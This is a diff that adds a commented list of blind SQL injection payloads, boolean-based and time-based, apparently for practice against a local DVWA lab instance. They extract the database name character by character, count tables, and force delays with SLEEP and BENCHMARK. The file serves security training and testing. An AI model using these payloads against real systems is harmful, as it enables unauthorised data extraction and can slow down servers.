@@ -1,0 +1,44 @@
+# ==============================================================================
+# Blind SQL Injection Payloads (Boolean-Based & Time-Based)
+# Target Scope: Local DVWA Blind SQLi (127.0.0.1:8080/vulnerabilities/sqli_blind/)
+# ==============================================================================
+
+# Context: Boolean TRUE baseline test.
+# Expected Result: Page displays "User ID exists in the database."
+1' AND 1=1 #
+
+# Context: Boolean FALSE baseline test.
+# Expected Result: Page displays "User ID is MISSING from the database." (revealing differential oracle).
+1' AND 1=2 #
+
+# Context: Database name character length verification (testing if length is 4).
+# Expected Result: Returns TRUE if database() name length equals 4 (e.g. 'dvwa').
+1' AND LENGTH(database()) = 4 #
+
+# Context: Character extraction at position 1 using ASCII code (testing for 'd' = ASCII 100).
+# Expected Result: Returns TRUE if first character of database name is ASCII 100 ('d').
+1' AND ASCII(SUBSTRING(database(), 1, 1)) = 100 #
+
+# Context: Character extraction at position 2 using ASCII code (testing for 'v' = ASCII 118).
+# Expected Result: Returns TRUE if second character of database name is ASCII 118 ('v').
+1' AND ASCII(SUBSTRING(database(), 2, 1)) = 118 #
+
+# Context: Binary search comparison operator (testing if ASCII value is greater than 100).
+# Expected Result: Returns TRUE if character ASCII value exceeds midpoint in binary search.
+1' AND ASCII(SUBSTRING(database(), 1, 1)) > 100 #
+
+# Context: Table count enumeration via boolean subquery.
+# Expected Result: Returns TRUE if table count in current schema equals 2.
+1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 2 #
+
+# Context: Time-based blind unconditional sleep test (5-second delay).
+# Expected Result: Response latency delayed by 5 seconds if injected into vulnerable numeric parameter.
+1 AND SLEEP(5) #
+
+# Context: Time-based blind conditional delay on single-quote parameter.
+# Expected Result: Server delays response by 3 seconds ONLY if first character of database() is 'd'.
+1' AND IF(SUBSTRING(database(), 1, 1) = 'd', SLEEP(3), 0) #
+
+# Context: Time-based blind benchmark delay alternative to SLEEP.
+# Expected Result: Server delays response by executing heavy SHA1 hashing loop 5,000,000 times.
+1' AND IF(1=1, BENCHMARK(5000000, SHA1('test')), 0) #
